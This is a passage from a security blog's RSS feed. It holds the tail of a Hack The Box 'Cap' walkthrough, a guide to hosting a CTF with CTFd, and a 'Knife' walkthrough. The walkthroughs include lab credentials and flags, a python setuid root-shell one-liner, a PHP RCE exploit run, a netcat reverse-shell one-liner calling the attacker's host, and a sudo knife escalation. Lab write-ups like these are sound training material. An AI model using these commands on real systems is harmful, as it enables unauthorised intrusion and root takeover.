1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/26%Time=60D742F4%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2555,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Sat,\x2026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20class=\&amp;#34;no-js\&amp;#34;\x20lang=\&amp;#34;en\&amp;#34;&amp;gt;\
SF:n\n&amp;lt;head&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\x20charset=\&amp;#34;utf-8\&amp;#34;&amp;gt;\n\x20\x20\x20\x2
SF:0&amp;lt;meta\x20http-equiv=\&amp;#34;x-ua-compatible\&amp;#34;\x20content=\&amp;#34;ie=edge\&amp;#34;&amp;gt;\n\x20\
SF:x20\x20\x20&amp;lt;title&amp;gt;Security\x20Dashboard&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\
SF:x20name=\&amp;#34;viewport\&amp;#34;\x20content=\&amp;#34;width=device-width,\x20initial-scale=
SF:1\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;shortcut\x20icon\&amp;#34;\x20type=\&amp;#34;image
SF:/png\&amp;#34;\x20href=\&amp;#34;/static/images/icon/favicon\.ico\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;
SF:link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/bootstrap\.min\.css\&amp;#34;&amp;gt;
SF:\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/fon
SF:t-awesome\.min\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20
SF:href=\&amp;#34;/static/css/themify-icons\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=
SF:\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/metisMenu\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x2
SF:0&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/owl\.carousel\.min\.
SF:css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/c
SF:ss/slicknav\.min\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;!--\x20amchar&amp;#34;)%r(HTTPOption
SF:s,B3,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x2
SF:026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(RTSPRequest,121,&amp;#34;HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n&amp;lt;html&amp;gt;\n\x20\x20&amp;lt;head&amp;gt;\n\x20\x20
SF:\x20\x20&amp;lt;title&amp;gt;Bad\x20Request&amp;lt;/title&amp;gt;\n\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20&amp;lt;body&amp;gt;\
SF:n\x20\x20\x20\x20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad\x20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&amp;amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;amp;#x27;RTSP
SF:/1\.0&amp;amp;#x27;&amp;amp;#x27;\n\x20\x20&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&amp;#34;)%r(FourOhFourRequest,189
SF:,&amp;#34;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20S
SF:at,\x2026\x20Jun\x202021\x2015:08:48\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n&amp;lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\&amp;#34;&amp;gt;\n&amp;lt;title&amp;gt;404\x20Not\x20Found&amp;lt;/title&amp;gt;\n&amp;lt;h1&amp;gt;Not\x20Found&amp;lt;/h1&amp;gt;
SF:\n&amp;lt;p&amp;gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&amp;lt;/p&amp;gt;\n&amp;#34;);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;About the website serving on port 80.
The website is about security details related to the server. The Dashboard shows line graph no. of Security events, failed logins and UDP scans. A user named Nathan is logged in and the &amp;lsquo;log-out&amp;rsquo; button doesn&amp;rsquo;t seems to work.&lt;/p&gt;
&lt;p&gt;There are other 3 pages for &amp;lsquo;5 sec PCAP analysis&amp;rsquo;, &amp;lsquo;ipconfig&amp;rsquo; and &amp;lsquo;network status&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;PCAP page(&lt;code&gt;http://10.10.10.245/data/27&lt;/code&gt;) shows about the no of packets and there is also a option to download the pcap&lt;/p&gt;
&lt;p&gt;ipconfig page shows the output of running &lt;code&gt;ipconfig&lt;/code&gt; in that server&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;eth0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x20&amp;lt;link&amp;gt;
        inet6 dead:beef::250:56ff:feb9:ada2  prefixlen 64  scopeid 0x0&amp;lt;global&amp;gt;
        ether 00:50:56:b9:ad:a2  txqueuelen 1000  (Ethernet)
        RX packets 1481197  bytes 182397986 (182.3 MB)
        RX errors 0  dropped 571  overruns 0  frame 0
        TX packets 1429580  bytes 350219656 (350.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&amp;lt;host&amp;gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 64730  bytes 4985798 (4.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 64730  bytes 4985798 (4.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Network status shows the output of running &lt;code&gt;netstat&lt;/code&gt; in that server&lt;/p&gt;
&lt;p&gt;On the PCAP page url we are also passing a number may be it is the index as each index stores pcap of 5 seconds. Using Burp Intruder I checked how many indexes are there and what are the no of packets in each of them. There were 32 indexes.
I rebooted the machine and checked again. Now there are ony 2 indexes. The 0 index have the same details as before. I downloaded the pcap and looked for anything useful.&lt;/p&gt;
&lt;p&gt;In the file I got a user and password for FTP.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;USER: Nathan
PASS: Buck3tH4TF0RM3!
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Cap]
└─$ ftp  10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1001     1001        46631 Jul 07  2020 LinEnum.sh
-rwxr-xr-x    1 1001     1001          887 Mar 10 14:03 enum.sh
-rwxr-xr-x    1 1001     1001        84889 Jul 07  2020 les.sh
-rw-rw-r--    1 1001     1001          415 Jul 17 10:29 les.txt
-rw-rw-r--    1 1001     1001       102798 Jul 17 10:28 linEnum.txt
-rw-rw-r--    1 1001     1001       105395 Jul 17 10:28 linpeas.txt
-rwxr-xr-x    1 1001     1001       325865 Mar 10 13:58 linpeasnew.sh
-rwxr-xr-x    1 1001     1001        37195 Jul 07  2020 linuxprivchecker.py
-rw-rw-r--    1 1001     1001        10240 Jul 17 10:30 lpc.tar
-rw-rw-r--    1 1001     1001            0 Jul 17 10:30 lpc.txt
-rwxr-xr-x    1 1001     1001        37909 Jul 07  2020 lse.sh
-rw-rw-r--    1 1001     1001       136262 Jul 17 10:29 lse.txt
-rwxrwxr-x    1 1001     1001        46632 Jul 18 13:34 mm.sh
-rw-rw-r--    1 1001     1001       358400 Jul 17 10:30 privesc.tar
drwxr-xr-x    3 1001     1001         4096 Jul 17 10:27 snap
-rwsrwxrwx    1 1001     1001           10 Jul 17 11:08 test.sh
-r--------    1 1001     1001           33 Jul 17 10:01 user.txt
226 Directory send OK.
ftp&amp;gt; cat user.txt
?Invalid command
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (287.7372 kB/s)
ftp&amp;gt; exit
221 Goodbye.
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Cap]
└─$ cat user.txt
fa4fb308e7486ab7ece2b4f2843c7480
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
&lt;p&gt;The same credentials are also used for ssh.&lt;/p&gt;
&lt;p&gt;After logging in through ssh I checked for SUID executables.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;nathan@cap:/$ find / -user root -perm -4000 -print 2&amp;gt;/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/8542/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Got nothing interesting from the list. I started looking for any hints in the forum. There was one hint, &amp;lsquo;the machine name is a big hint for all&amp;rsquo;. I searched for &amp;lsquo;Cap linux&amp;rsquo; and got that cap means capabilities in Linux. Then I searched for &amp;lsquo;capabilities linux priv esc&amp;rsquo;. From this article &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;Linux Privilege Escalation using Capabilities&lt;/a&gt; I got the solution for my next steps.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;nathan@cap:~$ getcap -r / 2&amp;gt;/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;cap_setuid enabled for python3. Use this to get root shell.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nathan@cap:~$ python3 -c &#39;import os; os.setuid(0); os.system(&amp;quot;/bin/bash&amp;quot;)&#39;
root@cap:~# pwd
/home/nathan
root@cap:~# cat /root/root.txt
97d73be5289b560b9ad38430ff79b0c3
root@cap:~#
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title> Hosting a CTF </title>
      <link>https://somesh-banerjee.github.io/blogs/posts/hosting-ctf/</link>
      <pubDate>Sat, 04 Sep 2021 15:40:28 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/hosting-ctf/</guid>
      <description>Introduction Creating a full-fledged platform to host a CTF is very time taking. Moreover, this task looks almost impossible if you are not a developer. This blog will tell how I created the CTF platform for my School InfoSec club using CTFd within a few minutes.
Choosing the Server To host the platform, you need a server that will be accessible to everyone. For the server, you can create one from Digital Ocean.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Creating a full-fledged platform to host a CTF is very time taking. Moreover, this task looks almost impossible if you are not a developer. This blog will tell how I created the CTF platform for my School InfoSec club using CTFd within a few minutes.&lt;/p&gt;
&lt;h1 id=&#34;choosing-the-server&#34;&gt;Choosing the Server&lt;/h1&gt;
&lt;p&gt;To host the platform, you need a server that will be accessible to everyone. For the server, you can create one from Digital Ocean. You have to decide what specifications you require based on the expected participants. In my case, I expected 100 participants, so I selected the following specifications:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RAM: 8GB&lt;/li&gt;
&lt;li&gt;Cpu: 4vCPUs&lt;/li&gt;
&lt;li&gt;Storage: 100GB&lt;/li&gt;
&lt;li&gt;Version: Ubuntu 20.04 LTS x64&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After the instance is created, Digital Ocean will provide you with an IP address and password. You can log in to your server with the credentials using Putty&lt;/p&gt;
&lt;h1 id=&#34;setting-up-ctf-platform&#34;&gt;Setting up CTF Platform&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;After logging in to the server, the first thing you need to do is update it and install the requirements. You will only need to install git, docker, and docker-compose.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt update
sudo apt install docker docker-compose git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now we need to clone the &lt;a href=&#34;https://github.com/CTFd/CTFd&#34;&gt;CTFd&lt;/a&gt; repo and move into it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone https://github.com/CTFd/CTFd
cd CTFd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Create a random key. This is used by the Application for security purpose. I am storing the key in the &lt;code&gt;.ctfd_secret_key&lt;/code&gt; file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;head -c &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; /dev/urandom &amp;gt; .ctfd_secret_key
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(Optional) Change the number of workers in &lt;code&gt;docker-compose.yml&lt;/code&gt; file. The higher the number the better it can manage traffic. In my case, I used 4 workers.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Running the platform&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo docker-compose up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;That&amp;rsquo;s it, now your platform will be running in port 80 and 8080. You can test it from your machine by going to &lt;code&gt;localhost:8080&lt;/code&gt; or using any other machine and going to the given IP.&lt;/p&gt;
&lt;p&gt;Now you need the rest of the setup from the platform. The guide for that setup is available at the Repo.&lt;/p&gt;
&lt;p&gt;The basic requirement for the platform is covered. But if you are hosting it at a global level, then you need to implement security feature like Rate limiting and Firewall to the server. You also need the get a domain for your IP from GoDaddy or somewhere else. You can check this &lt;a href=&#34;https://medium.com/csictf/self-hosting-a-ctf-platform-ctfd-90f3f1611587&#34;&gt;article&lt;/a&gt; for more.&lt;/p&gt;
&lt;h1 id=&#34;firewall-setup&#34;&gt;Firewall Setup&lt;/h1&gt;
&lt;p&gt;I will cover the basic steps required to setup a firewall which will only allow http/https and SSH traffic to the server.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt update
sudo ufw allow &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nginx Full&amp;#39;&lt;/span&gt;
sudo ufw allow &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;OpenSSH&amp;#39;&lt;/span&gt;
sudo ufw enable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Knife Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/knife/</link>
      <pubDate>Sun, 29 Aug 2021 13:26:11 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/knife/</guid>
      <description>OS: Linux
Points: 20
Difficulty: Easy
ip=10.10.10.242
User solution The first thing is to do the nmap scan.
┌──(kali㉿kali)-[~/HTB/Knife] └─$ ip=10.10.10.242 ┌──(kali㉿kali)-[~/HTB/Knife] └─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) ┌──(kali㉿kali)-[~/HTB/Knife] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT Nmap scan report for 10.10.10.242 Host is up (0.</description>
      <content>&lt;p&gt;OS: Linux&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip=10.10.10.242&lt;/p&gt;
&lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
&lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ip=10.10.10.242
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//)
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
Nmap scan report for 10.10.10.242
Host is up (0.083s latency).
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now lets look at website at port 80. &lt;br&gt;
From the nmap scan we know that the server uses Apache 2.4.41 and Ubuntu OS. Using Wappalyzer we found it also uses PHP 8.1.0.\&lt;/p&gt;
&lt;p&gt;There is a RCE exploit for PHP 8.1.0. Download it from &lt;a href=&#34;https://www.exploit-db.com/exploits/49933&#34;&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Run the exploit and got the flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ python3 exploits/49933.py
Enter the full host url:
http://10.10.10.242/
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Interactive shell is opened on http://10.10.10.242/
Can&amp;#39;t acces tty; job crontol turned off.
$ whoami
james
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;$ pwd
/
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;$ cd /home/james; ls; cat user*
authorized_keys
hello
hello.rb
user.txt
aec6c92f2b998dc3912f334ac0c69ed5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
&lt;p&gt;Before procedding lets get a reverse shell at port 5454 with &lt;code&gt;mkfifo /tmp/f; nc &amp;lt;local-ip&amp;gt; 5454 &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;amp;1; rm /tmp/f&lt;/code&gt; and run &lt;code&gt;nc -lvnp 5454&lt;/code&gt; before running the command.&lt;/p&gt;
&lt;p&gt;I was unable to do the root part while the machine was active. Later from a help I realized I forgot to check GTFObins.&lt;/p&gt;
&lt;p&gt;Coming to the process first we have to see which executables we can run as sudo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Search GTFObins for knife you will get a command for shell&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo knife exec -E &amp;#39;exec &amp;#34;/bin/sh&amp;#34;&amp;#39;
# whoami
root
# cat root/root.txt
b1c946e0dcc0715cb9039799fe824278
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
  </channel>
</rss>
